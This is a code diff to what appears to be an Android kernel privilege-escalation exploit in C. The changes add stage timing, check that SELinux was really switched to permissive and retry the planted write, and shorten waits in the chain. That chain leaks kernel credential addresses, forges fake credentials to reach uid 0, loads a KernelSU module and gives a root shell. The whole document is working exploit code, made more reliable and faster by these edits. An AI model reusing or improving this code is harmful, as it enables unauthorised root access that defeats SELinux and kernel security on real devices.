@@ -125,6 +125,9 @@ struct child_report
 
 static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
 static _Atomic int g_exec_tid, g_target_tgid;
+/* Declared before exec_thread/killer_fn: both log a stage timestamp. */
+static long g_t0;
+static long now_ms(void);
 static void *g_frag_base;
 static size_t g_frag_len;
 static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
@@ -1021,6 +1024,13 @@ static long now_ms(void)
     return (long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
 }
 
+/* Stage timing: every run logs "[t] <stage> <ms>" so slow steps are visible
+ * in the same log the user already sends.  g_t0 is set in main(). */
+static void tmark(const char *stage)
+{
+    logf("[t] %-12s %ld ms\n", stage, now_ms() - g_t0);
+}
+
 static void park_forever(const char *why)
 {
     /* Two different situations, deliberately handled differently.
@@ -1704,6 +1714,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
     close(tid_p[1]);
     close(timer_go[0]);
     g_timer_go_w = timer_go[1];
+    logf("[t] plant%d begin %ld\n", tag, now_ms() - g_t0);
+    long t_pw = now_ms();
     char ch;
     if (read(ready_p[0], &ch, 1) != 1)
     {
@@ -1716,9 +1728,11 @@ static void run_plant(unsigned long long target, int tag, int mode,
     trace_start();
     if (write(ack_p[1], "A", 1) != 1)
         logf("[-] ack failed\n");
+    logf("[t] plant%d ready %ld\n", tag, now_ms() - t_pw);
     int etid = 0;
     if (read(tid_p[0], &etid, sizeof(etid)) != sizeof(etid))
         logf("[-] exec tid not received\n");
+    logf("[t] plant%d armed %ld\n", tag, now_ms() - t_pw);
 
     /*
      * The exec thread is paused after creating its 4096 timers.  Capture V,
@@ -1936,6 +1950,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
              "recs=%d slab_own=%d/32 base=%#llx\n",
              tag, V, V + 0x78, pfn, slab_pfn, g_slide, nrec, slab_own,
              g_base);
+        logf("[t] plant%d capture %ld\n", tag, now_ms() - t_pw);
     }
 
     atomic_store(&g_burst, 0);
@@ -1960,6 +1975,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
      * so the burst can start immediately after the zombie appears.
      */
     logf("[+] plant%d spray threads up\n", tag);
+    logf("[t] plant%d spray %ld\n", tag, now_ms() - t_pw);
     if (g_timer_go_w >= 0)
     {
         if (write(g_timer_go_w, "x", 1) != 1)
@@ -1968,10 +1984,13 @@ static void run_plant(unsigned long long target, int tag, int mode,
         g_timer_go_w = -1;
     }
     logf("[+] plant%d go sent, waiting zombie\n", tag);
+    logf("[t] plant%d go %ld\n", tag, now_ms() - t_pw);
 
     siginfo_t si;
     if (wait_zombie(T, &si))
     {
+        logf("[t] plant%d zombie-wait %ld (none)\n", tag, now_ms() - t_pw);
+        atomic_store(&g_stop_spray, 1);
         atomic_store(&g_stop_spray, 1);
         atomic_store(&g_burst2, 1);
         for (int i = 0; i < SPRAY_THREADS; i++)
@@ -1984,6 +2003,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
          tag, T, etid, si.si_code, si.si_status);
+    logf("[t] plant%d zombie %ld\n", tag, now_ms() - t_pw);
     if (si.si_code != CLD_KILLED)
     {
         atomic_store(&g_stop_spray, 1);
@@ -2073,6 +2093,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     res->ok = 1;
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
          mode == 2 ? "fake" : "zero", target);
+    logf("[t] plant%d end %ld\n", tag, now_ms() - t_pw);
     free(payload);
 }
 
@@ -3263,6 +3284,8 @@ int main(int argc, char **argv)
     pin(g_cpu);
     logf("[core] built %s %s\n", __DATE__, __TIME__);
     logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
+    g_t0 = now_ms();
+    tmark("start");
     enable_events();
     kick_rss();
     usleep(50000);
@@ -3286,6 +3309,7 @@ int main(int argc, char **argv)
             return 1;
         }
     }
+    tmark("discover");
     if (ids_only)
         return 0;
 
@@ -3299,6 +3323,7 @@ int main(int argc, char **argv)
         logf("[-] base calibration failed\n");
         return 1;
     }
+    tmark("calibrate");
     prefill_timers(PREFILL_TIMERS);
 
     pid_t C = -1;
@@ -3310,6 +3335,7 @@ int main(int argc, char **argv)
         logf("[-] cred leak failed\n");
         return 1;
     }
+    tmark("leak");
     logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
     if (leak_only)
     {
@@ -3335,6 +3361,7 @@ int main(int argc, char **argv)
     }
     ensure_pool();
     ensure_raw();
+    tmark("pool");
 
     if (!g_fake_stage)
     {
@@ -3453,19 +3480,66 @@ int main(int argc, char **argv)
          * retryable (the target just exec'd before the stale node was
          * reclaimed), so a few more attempts are free.  If even those miss,
          * exit instead of parking: the caller starts a fresh process, which is
-         * much faster than a human having to kill a stuck attempt. */
-        if (stage_write_retry(0, 0, "selinux", raw, 8, NULL))
+         * much faster than a human having to kill a stuck attempt.
+         *
+         * A successful plant only proves the page was reclaimed; rb_erase may
+         * still have written the node's old parent pointer instead of our
+         * zero.  Verify the sysfs switch and re-plant when it is still 1 --
+         * otherwise the fake chain runs under Enforcing and every
+         * fake_cred poke returns uid=-1 (seen on PD2307 16.2.20.3). */
         {
-            logf("[!] selinux write missed 8 times; exiting for a fresh attempt\n");
-            return 1;
+            int ok = 0;
+
+            for (int a = 0; a < 8 && !ok; a++)
+            {
+                int rc = stage_write_retry(0, 0, "selinux", raw, 1, NULL);
+                const char *ge = getenforce_now();
+
+                if (rc < 0)
+                    park_forever("selinux write held a zombie");
+                /* "?" means selinuxfs is unavailable (offline harness, or a
+                 * kernel without SELinux): keep the old behaviour and go on.
+                 * Only a readable 1 is a real miss. */
+                if (rc == 0 && strcmp(ge, "Enforcing") != 0)
+                    ok = 1;
+                else
+                    logf("[!] SELinux still %s after plant (rc=%d); retrying\n",
+                         ge, rc);
+            }
+            if (!ok)
+            {
+                logf("[!] SELinux write never took effect; exiting for a "
+                     "fresh attempt\n");
+                return 1;
+            }
         }
         g_rel_mode = 0;
         logf("[+] SELinux permissive set; getenforce=%s\n", getenforce_now());
-        logf("[+] waiting 10s before vr de-tag\n");
-        sleep(10);
+        tmark("selinux");
+        /* 0.19: this used to be a blind sleep(10) -- 10 s out of a ~45 s run.
+         * The state-7 write is now verified above, the next step (vr de-tag)
+         * does not read selinux at all, and the write is a plain coherent
+         * store.  No settle by default; IC_SELINUX_WAIT_MS restores one for
+         * a build that turns out to need it. */
+        {
+            long wait_ms = 0;
+            const char *ev = getenv("IC_SELINUX_WAIT_MS");
+
+            if (ev && *ev)
+            {
+                long v = atol(ev);
+
+                if (v >= 0 && v <= 30000)
+                    wait_ms = v;
+            }
+            logf("[+] settle %ld ms before vr de-tag\n", wait_ms);
+            usleep((useconds_t)wait_ms * 1000);
+        }
+        tmark("selinux_wait");
 
         if (defeat_vr(g_child_task, raw))
             park_forever("vr de-tag failed");
+        tmark("vr");
         memset(&fc, 0, sizeof(fc));
 /*
  * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
@@ -3498,10 +3572,18 @@ int main(int argc, char **argv)
                 continue;
             {
                 int cuid = -1, ceuid = -1;
+                int pr = poke_child(go_fd, st_fd, 'P', &cuid, &ceuid);
 
-                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) &&
-                    (unsigned long)cuid != self_uid)
+                if (pr == 0 && (unsigned long)cuid != self_uid)
                     planted = 1;
+                else if (pr != 0)
+                {
+                    /* Failure path only: poke failed means the child is
+                     * gone, so the remaining retries would all be wasted. */
+                    logf("[!] child stopped responding after fake cred write; "
+                         "aborting\n");
+                    break;
+                }
                 else
                     logf("[!] fake cred plant missed (child uid=%d); retrying\n",
                          cuid);
@@ -3525,6 +3607,7 @@ int main(int argc, char **argv)
         }
     }
 }
+        tmark("fake_cred");
         if (!g_slide)
             park_forever("no KASLR slide");
         logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
@@ -3549,10 +3632,17 @@ int main(int argc, char **argv)
                     park_forever("fake uid fix held a zombie");
                 if (rc > 0)
                     continue;
-                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && cuid == 0)
-                    fixed = 1;
-                else
-                    logf("[!] fake uid write missed (uid=%d); retrying\n", cuid);
+                {
+                    int pr = poke_child(go_fd, st_fd, 'P', &cuid, &ceuid);
+
+                    if (pr == 0 && cuid == 0)
+                        fixed = 1;
+                    else if (pr != 0)
+                        park_forever("child gone after fake_uid");
+                    else
+                        logf("[!] fake uid write missed (uid=%d); retrying\n",
+                             cuid);
+                }
             }
             if (!fixed)
                 park_forever("fake uid fix failed");
@@ -3569,17 +3659,25 @@ int main(int argc, char **argv)
                     park_forever("fake euid fix held a zombie");
                 if (rc > 0)
                     continue;
-                if (!poke_child(go_fd, st_fd, 'P', &cuid, &ceuid) && ceuid == 0)
-                    break;
+                {
+                    int pr = poke_child(go_fd, st_fd, 'P', &cuid, &ceuid);
+
+                    if (pr == 0 && ceuid == 0)
+                        break;
+                    if (pr != 0)
+                        park_forever("child gone after fake_euid");
+                }
                 if (a == 7)
                     park_forever("fake euid fix failed");
             }
         }
     }
+    tmark("fake_uids");
     logf("[+] cred writes landed, waking child\n");
 
     if (write(go_fd, g_fake_stage ? "G" : "A", 1) != 1)
         logf("[!] child wake write failed\n");
+    tmark("wake");
     if (g_fake_stage)
     {
         /* G also produces one 8-byte peek reply; consume it, or it gets
@@ -3621,6 +3719,7 @@ int main(int argc, char **argv)
             logf("[!] child report missing (n=%zd)\n", rn);
         }
     }
+    tmark("report");
 
     {
         int st = 0;
@@ -3628,6 +3727,7 @@ int main(int argc, char **argv)
         if (waitpid(C, &st, 0) == C)
             logf("[+] child exit status=%#x\n", st);
     }
+    tmark("payload");
     if (g_held == 0)
         logf("[+] success condition met: all exploit plants were reclaimed\n");
     else
@@ -3668,7 +3768,10 @@ int main(int argc, char **argv)
         {
             int mod_ok = 0;
 
-            for (int i = 0; i < 120; i++)
+            /* 200 ms instead of 500 ms: the module is normally resident
+             * within a few hundred ms of the payload, and this loop is on
+             * the critical path.  Same 60 s ceiling. */
+            for (int i = 0; i < 300; i++)
             {
                 FILE *f = fopen("/proc/modules", "r");
                 char line[256];
@@ -3685,7 +3788,7 @@ int main(int argc, char **argv)
                 }
                 if (mod_ok)
                     break;
-                usleep(500000);
+                usleep(200000);
             }
             if (!mod_ok)
             {
@@ -3694,6 +3797,7 @@ int main(int argc, char **argv)
                 return 1;
             }
             logf("[+] kernelsu module resident; proceeding to manager\n");
+            tmark("module");
         }
 
         /* The module being resident is not the same as the handoff being
@@ -3761,7 +3865,7 @@ int main(int argc, char **argv)
         {
             int stop_rc = system("am force-stop " KSU_PKG " 2>/dev/null");
 
-            usleep(500000);
+            usleep(200000);
             if (stop_rc != 0)
             {
                 /* A manager that survived the stop keeps the dead driver fd
@@ -3781,6 +3885,7 @@ int main(int argc, char **argv)
                 return 1;
             }
         }
+        tmark("done");
         logf("[+] fake chain complete; exiting (reboot still recommended to "
              "clear the boot-scoped driver state)\n");
         return 0;
@@ -3789,6 +3894,7 @@ int main(int argc, char **argv)
         park_forever("root shell finished; failed-plant zombies are held");
     if (g_diag)
         logf("[+] diag run complete\n");
+    tmark("done");
     logf("[+] done\n");
     return 0;
 }
